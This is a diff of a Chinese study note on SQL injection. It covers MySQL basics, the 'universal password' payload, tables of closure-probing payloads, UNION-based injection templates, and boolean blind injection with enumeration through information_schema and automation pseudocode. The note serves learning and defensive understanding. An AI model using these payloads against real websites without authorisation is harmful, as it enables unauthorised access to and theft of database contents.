@@ -1,8 +1,11 @@
 ---
-title: "SQL注入知识整理"
+title: SQL注入知识整理
 date: 2026-05-05
-tags: ["SQL注入", "Web安全", "数据库"]
-categories: ["学习笔记"] 
+tags: [SQL注入, Web安全, 数据库]
+categories: 学习笔记
+abbrlink: sql-injection-notes
+description: SQL注入基础知识整理，包括MySQL基本操作、注入原理、常用函数与系统表、注入点闭合方式识别、联合查询注入、布尔盲注等方法论
+mathjax: false
 ---
 
 ## 数据库
@@ -11,7 +14,8 @@ categories: ["学习笔记"]
 网站开发中，大多数数据库采用关系型数据库管理系统（RDBMS）来组织数据，通过** SQL 语言**来编程。但有些数据库没有遵循上述的组织数据的机制，这类被称作 **NoSQL 数据库**。
 
 被广泛使用的服务端关系型数据库有**MySQL**（或者它的分支 MariaDB）、SQL Server 和 Oracle Database 等。另一边，出名的 NoSQL 数据库有 MongoDB、Cassandra 和 Redis 等。
-#### MySQL
+
+### MySQL
 
 - MySQL是开源的，而且可以根据不同的需求进行定制。我们通过客户端程序可以进行连接（比如PHP,Java,python等），然后还需要通过账号密码来登录。
 
@@ -20,38 +24,37 @@ categories: ["学习笔记"]
   ***SQL语法特点：***
 
 1. 以分号(;)结尾，且关键词不区分大小写（一般可以关键词全大写,与参数区分开）
-2. #：注释从#字符到行尾 
-    -- ：注释从-- 序列到行尾。使用此注释时，后面需要跟上一个或多个空格 
-    /* */ ：注释从 /* 序列到后面的 */ 序列中间的字符。注意 /*!*/ 不是注释，例如：/*！ 55555,name*/ 意思是：若MySQL版本号大于等于5.55.55，语句将会被执行，如果！后面不加入版本号，MySQL将会直接执行SQL语句。
-
+2. `#`：注释从#字符到行尾  
+    `--` ：注释从 -- 序列到行尾。使用此注释时，后面需要跟上一个或多个空格  
+    `/* */`：注释从 /* 序列到后面的 */ 序列中间的字符。注意 `/*!*/` 不是注释，例如：`/*！55555,name*/` 意思是：若MySQL版本号大于等于5.55.55，语句将会被执行，如果！后面不加入版本号，MySQL将会直接执行SQL语句。
 
   ***SQL语句***：
 
-  - ***DDL(Data Definition Language):数据定义语言，操作整个库，表结构***
-    查看数据库列表`show databases`
-    创建数据库`create database 数据库名称`
-    删除数据库`drop database 数据库名称`
-    修改数据库`alter database 数据库名称 charset=编码方式 -- 修改编码方式`
-    使用数据库`use 库名`
-    查看当前正在使用的数据库`select database()`
-    创建数据表`create table 表名(列名1 数据类型(可选),列名2 数据类型(可选)...);`
+  - ***DDL(Data Definition Language): 数据定义语言，操作整个库，表结构***
+    查看数据库列表 `show databases`
+    创建数据库 `create database 数据库名称`
+    删除数据库 `drop database 数据库名称`
+    修改数据库 `alter database 数据库名称 charset=编码方式 -- 修改编码方式`
+    使用数据库 `use 库名`
+    查看当前正在使用的数据库 `select database()`
+    创建数据表 `create table 表名(列名1 数据类型(可选),列名2 数据类型(可选)...);`
     
-  - ***DML(Manipulation):数据操作语言，操作表内部的数据***
-    insert插入一行数据`insert into 表名 (列名1,列名2...) values (数据)`
-  	           注：可以省略列名，这样插入的数据就会按列顺序依次插入对应的列;
-                      可以只插入部分列，对应没有插入的列都会用null填充
-    delete删除数据`delete from 表名 where 条件`(如果不设置where条件，那整个表的数据会被全部删除)
-    update修改数据`update 表名 set 列=值,列=值.... where 条件`
+  - ***DML(Manipulation): 数据操作语言，操作表内部的数据***
+    insert插入一行数据 `insert into 表名 (列名1,列名2...) values (数据)`
+    注：可以省略列名，这样插入的数据就会按列顺序依次插入对应的列;
+    可以只插入部分列，对应没有插入的列都会用null填充
+    delete删除数据 `delete from 表名 where 条件`(如果不设置where条件，那整个表的数据会被全部删除)
+    update修改数据 `update 表名 set 列=值,列=值.... where 条件`
     
-  - ***DCL(Control):数据控制语言，改变数据库和用户的权限***
-    创建用户`CREATE USER 用户名@地址(@'host') IDENTIFIED BY '密码';`
-    给用户授权`GRANT 权限1, … , 权限n ON 数据库.对象  TO 用户名;`
-    取消权限`REVOKE 权限1, … , 权限n ON 数据库.对象  FROM 用户名;`
-    查看用户权限`show grants for 用户名;`
+  - ***DCL(Control): 数据控制语言，改变数据库和用户的权限***
+    创建用户 `CREATE USER 用户名@地址(@'host') IDENTIFIED BY '密码';`
+    给用户授权 `GRANT 权限1, … , 权限n ON 数据库.对象 TO 用户名;`
+    取消权限 `REVOKE 权限1, … , 权限n ON 数据库.对象 FROM 用户名;`
+    查看用户权限 `show grants for 用户名;`
     
-  - ***DQL(Query):数据查询语言，用来查询数据***
+  - ***DQL(Query): 数据查询语言，用来查询数据***
 
-  ```
+  ```sql
   SELECT 要查询的列名称(*表示所有列)
   FROM 表名称
   WHERE 限定条件 （ 行条件 ）
@@ -61,35 +64,33 @@ categories: ["学习笔记"]
   LIMIT offset_start，row_count （结果限定）
   ```
 
-  **查询列**`select * from 表名; --查询所有列`
-              `select 列名 from 表名; --查询指定列`
-  **条件查询**`select * from 表名 where 条件;`
+  **查询列** `select * from 表名; --查询所有列`
+  `select 列名 from 表名; --查询指定列`
+  **条件查询** `select * from 表名 where 条件;`
   **模糊查询**
-  ```
+  ```sql
   select * from test_table where name like 'a%';
   -- 模糊查询，只查询名字以a开头的一行
   '_':任意一个字符
   '%':任意多个字符(可以是0个)
   ```
   **为结果排序**
-
-`select * from test_table order by age asc;`（asc是升序，desc是降序，默认是升序）
+  `select * from test_table order by age asc;`（asc是升序，desc是降序，默认是升序）
   **分页查看查询结果**
-
-  ```
+  ```sql
   select * from test_table limit 0,2
   -- limit 0,2 表示从第0行开始，只显示2行记录
   ```
-**联合查询**
-  ```
+  **联合查询**
+  ```sql
   select * from table1 union select * from test_table;
   -- union 合并前后两个(或者多个)select的结果，默认去重
   -- 两个表的字段数(列数)必须相同，且对应列的数据类型应兼容（MySQL 不强制相同，但最好一致）
   ```
+
 - **MySQL使用**
   先进入mysql的安装目录（PHPStudy安装的，在PHPStudy 中的Extensions\MySQL...\bin）
-
-  然后输入命令：`mysql -u root(用户名) -p`，在输入密码，连接上以后就可以通过命令行执行SQL语句了，可以打\h自行探索
+  然后输入命令：`mysql -u root(用户名) -p`，在输入密码，连接上以后就可以通过命令行执行SQL语句了，可以打 `\h` 自行探索
 
 ## SQL注入
 
@@ -97,15 +98,14 @@ categories: ["学习笔记"]
 - SQL注入产生的原因：
 当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。
 - SQL注入的本质：
-  服务器把用户的输入作为SQL语句的一部分来执行，违背了“数据和代码分离原则”
-  **万能密码**`1' or '1' = '1`
-```
-  原始查询：SELECT * FROM users WHERE username='admin' AND password='$password'
+  服务器把用户的输入作为SQL语句的一部分来执行，违背了"数据和代码分离原则"
+  **万能密码** `1' or '1' = '1`
+```sql
+原始查询：SELECT * FROM users WHERE username='admin' AND password='$password'
 输入密码：1' or '1'='1
-  拼接后：SELECT * FROM users WHERE username='admin' AND password='1' or '1'='1'
-  -- '1'='1'是恒真的，所以整个判断语句'1' or '1'='1'也一定为真
+拼接后：  SELECT * FROM users WHERE username='admin' AND password='1' or '1'='1'
+-- '1'='1'是恒真的，所以整个判断语句也一定为真
 ```
-
 
 ### SQL注入常用函数与系统表
 
@@ -144,16 +144,12 @@ SELECT table_name FROM information_schema.tables WHERE table_schema='库名';
 SELECT column_name FROM information_schema.columns WHERE table_schema='库名' AND table_name='表名';
 ```
 
-好的，以下是独立的 **“注入点闭合方式识别”** 章节，可以直接插入到你的 `SQL注入知识整理.md` 中的 `### SQL注入方法` 之前（或之后），作为通用前置知识。
-
-
-
 ### 注入点闭合方式识别
 
-#### 1.为什么需要识别闭合方式？
+#### 1. 为什么需要识别闭合方式？
 后端 SQL 语句中，用户输入的参数可能被单引号、双引号、括号等字符包裹。注入时必须先**闭合**这些包裹符，并用注释符（如 `--+` 或 `#`）截断后续的 SQL 片段，否则构造的恶意语句会产生语法错误，导致注入失败。
 
-#### 2.通用探测方法
+#### 2. 通用探测方法
 依次提交以下 payload，观察页面变化（从正常显示 → 报错 → 恢复正常）：
 
 | Payload | 预期恢复正常的情况 | 推断的闭合方式 |
@@ -167,7 +163,7 @@ SELECT column_name FROM information_schema.columns WHERE table_schema='库名' A
 
 > 注：`--+` 中 `+` 在 URL 中被解码为空格，作为注释符。也可使用 `#`（需编码为 `%23`）或 `--%20`。  
 
-#### 3.验证方法
+#### 3. 验证方法
 找到疑似闭合方式后，用逻辑条件测试：
 ```
 ?id=1[闭合符] and 1=1 --+   → 正常显示
@@ -175,7 +171,7 @@ SELECT column_name FROM information_schema.columns WHERE table_schema='库名' A
 ```
 若满足上述差异，则闭合方式正确。
 
-#### 4.常见闭合方式速查表
+#### 4. 常见闭合方式速查表
 
 | 后端 SQL 示例（伪代码） | 闭合方式 | 测试 Payload |
 | --- | --- | --- |
@@ -186,13 +182,10 @@ SELECT column_name FROM information_schema.columns WHERE table_schema='库名' A
 | `WHERE id = ("$id")` | `")` | `1") and 1=1 --+` |
 | `WHERE id = (('$id'))` | `'))` | `1')) and 1=1 --+` |
 
-#### 5.小技巧
+#### 5. 小技巧
 - 先尝试最简单的 `'` 和 `"`，如果不成功再加括号。
 - 观察错误信息中回显的 SQL 片段，有时会直接提示闭合字符（例如 `near ''1'') LIMIT` 暗示了 `')`）。
 - 如果页面完全没有错误回显（盲注），则需要通过布尔或时间差异来盲猜闭合方式，效率较低，优先尝试常见组合。
-
-
-
 
 ### SQL注入方法
 
@@ -202,36 +195,28 @@ SELECT column_name FROM information_schema.columns WHERE table_schema='库名' A
 攻击者利用 SQL 的 `UNION` 关键字，将自定义的 `SELECT` 语句结果附加到原始查询结果之后，从而在页面回显位置直接获取数据库中的敏感信息。
 
 ##### 1.2 适用条件
-
-
 - 存在 SQL 注入漏洞。
 - 页面有明确的回显位（即查询结果中的某些列会被输出到页面）。
 - 攻击者能够控制 `UNION` 后面的查询语句。
 
-
 ##### 1.3 核心原理
-  `UNION` 操作符用于合并两个或多个 `SELECT` 语句的结果集。使用时有两条硬性规则：
-  1. **列数必须相同**：所有 `SELECT` 语句必须返回相同数量的列。
-  2. **数据类型应兼容**：对应列的数据类型必须能隐式转换（注入中常用数字 `1,2,3` 占位，因为数字与大多数字符串类型兼容）。
+`UNION` 操作符用于合并两个或多个 `SELECT` 语句的结果集。使用时有两条硬性规则：
+1. **列数必须相同**：所有 `SELECT` 语句必须返回相同数量的列。
+2. **数据类型应兼容**：对应列的数据类型必须能隐式转换（注入中常用数字 `1,2,3` 占位，因为数字与大多数字符串类型兼容）。
 
 ##### 1.4 不同闭合方式的 Payload 示例
-- **数字型**（无闭合）：`?id=-1 union select 1,2,3`
-
+- **数字型**（无闭合）：`?id=-1 union select 1,2,3`  
   注：数字型一般不需要注释符，但如果原语句后面还有其他条件导致报错，可加 `--+` 注释。
-
 - **单引号字符型**：`?id=-1' union select 1,2,3 --+`
-
 - **双引号字符型**：`?id=-1" union select 1,2,3 --+`
-
 - **单引号+括号**：`?id=-1') union select 1,2,3 --+`
-
 - **双引号+括号**：`?id=-1") union select 1,2,3 --+`
 
 ##### 1.5 注：
-1. **用 `ORDER BY N`  探测原始查询的列数**
+1. **用 `ORDER BY N` 探测原始查询的列数**
 > `ORDER BY N` 表示按查询结果的**第 N 列**进行排序。如果实际结果只有 M 列，执行 `ORDER BY M+1` 时，数据库会因找不到该列而报错。因此，通过递增 N 直到报错，可以确定原始查询的列数。  
 
-2. **构造 `UNION SELECT 1,2,3,...`时使原始查询结果为空，例如设置 `id=-1`**
+2. **构造 `UNION SELECT 1,2,3,...` 时使原始查询结果为空，例如设置 `id=-1`**
 > 当使用 `UNION SELECT` 时，数据库会返回两行（或更多）结果:  
 > 第一行：原始查询的结果（比如正常 id 对应的数据）。  
 > 第二行：`UNION` 附加的自定义数据。  
@@ -247,7 +232,6 @@ SELECT column_name FROM information_schema.columns WHERE table_schema='库名' A
 ##### 1.6 典型 Payload 模板(以单引号字符型为例)
 
 **思路**：
-
 > 1.判断注入点（引号、注释、真假条件）。  
 > 2.判断列数（order by）。  
 > 3.尝试 union 看是否有回显（显示位）。  
@@ -285,9 +269,10 @@ SELECT column_name FROM information_schema.columns WHERE table_schema='库名' A
 ##### 2.2 适用条件
 - 存在 SQL 注入漏洞。
 - 页面没有回显位（不能使用 `union select` 直接输出数据）。
-- 页面存在明显的“真/假”状态差异（比如：条件为真时显示正常内容，为假时无内容或报错）。
+- 页面存在明显的"真/假"状态差异（比如：条件为真时显示正常内容，为假时无内容或报错）。
 
 ##### 2.3 核心函数
+
 | 函数 | 作用 | 布尔盲注中的典型用法 |
 |------|------|----------------------|
 | `length(str)` | 返回字符串长度 | `length(目标表达式) = N` 判断长度是否为 N |
@@ -301,21 +286,17 @@ SELECT column_name FROM information_schema.columns WHERE table_schema='库名' A
 ```sql
 and length((子查询)) = N
 ```
-
 从 N=1 开始递增，直到页面正常，即获得长度 L。
 
 **2. 逐字符获取内容**
-
 ```sql
 and ascii(substr(子查询, 位置, 1)) = ASCII码
 ```
-
 - 位置从 1 到 L。
 - ASCII码 从 32（空格）到 126（`~`）遍历，命中时记录字符。
 - 最终拼接出完整字符串。
 
 **3. 枚举数据（表名、列名、数据）**
-
 - 表名：子查询为 `select table_name from information_schema.tables where table_schema=database() limit N,1`
 - 列名：子查询为 `select column_name from information_schema.columns where table_schema=database() and table_name='表名' limit N,1`
 - 数据：子查询为 `select 列名 from 表名 limit N,1`
@@ -323,10 +304,8 @@ and ascii(substr(子查询, 位置, 1)) = ASCII码
 > **`limit N,1` 的作用**：跳过 N 条记录，取接下来的 1 条记录。这样可以通过改变 N 的值（0,1,2,...）依次获取每条数据。
 
 ##### 2.5 效率与自动化
-
 - 通常借助脚本或工具（如 sqlmap）实现自动化。
 - 脚本核心逻辑（伪代码）：
-
 ```python
 # 以单引号字符型为例，实际使用时根据注入点调整闭合前缀和注释符
 def test(condition):
@@ -347,7 +326,6 @@ for pos in range(1, length+1):
 ```
 
 ##### 2.6 注意事项
-
 - 注释符推荐使用 `#`（在 URL 中会被正确编码为 `%23`），避免 `--+` 的编码问题。
 - 如果目标字符串可能包含非打印字符或中文，ASCII 范围可扩展至 0~255，但请求量会增加。
 - 实际测试中可先用**二分法**优化 ASCII 遍历，减少请求次数。
